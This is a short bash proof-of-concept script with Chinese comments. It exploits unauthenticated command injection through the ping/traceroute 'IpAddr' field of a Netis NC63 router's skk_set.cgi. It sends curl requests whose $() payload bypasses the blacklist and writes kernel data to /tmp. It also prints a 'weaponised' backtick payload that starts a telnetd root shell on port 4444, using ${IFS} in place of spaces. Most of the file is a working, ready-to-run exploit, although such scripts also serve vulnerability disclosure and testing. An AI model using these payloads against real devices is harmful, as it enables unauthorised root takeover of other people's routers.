#!/bin/bash
# FIND-0005 PoC — Netis NC63 V3.0.0.3327 tools_set ping IpAddr 黑名单绕过注入
# FUN_0040ee48: 黑名单仅 空格/|/;/& → $() 反引号 > < ${IFS} 全部可用。
# type=1 ping, type=2 traceroute 两分支同病。未认证，root 执行。
# 用法: ./poc_find0005.sh <目标IP> [端口]
set -e
HOST="${1:?usage: $0 <host> [port]}"; PORT="${2:-80}"
URL="http://$HOST:$PORT/cgi-bin/skk_set.cgi"

echo "[*] 基线 ping（验证链路）"
curl -s -m 10 "$URL" \
  --data-urlencode "tools_set=1" --data-urlencode "type=1" \
  --data-urlencode "IpAddr=127.0.0.1"
echo

echo "[*] 注入: \$() 命令替换写标记文件"
curl -s -m 10 "$URL" \
  --data-urlencode "tools_set=1" --data-urlencode "type=1" \
  --data-urlencode 'IpAddr=127.0.0.1$(cat</proc/version>/tmp/pwn_ping)'
echo
echo "[*] 已发送。设备上 /tmp/pwn_ping 应含内核版本。"
echo "[*] 武器化示例（真实设备反弹/开启 shell）:"
echo '    IpAddr=`telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}4444`'
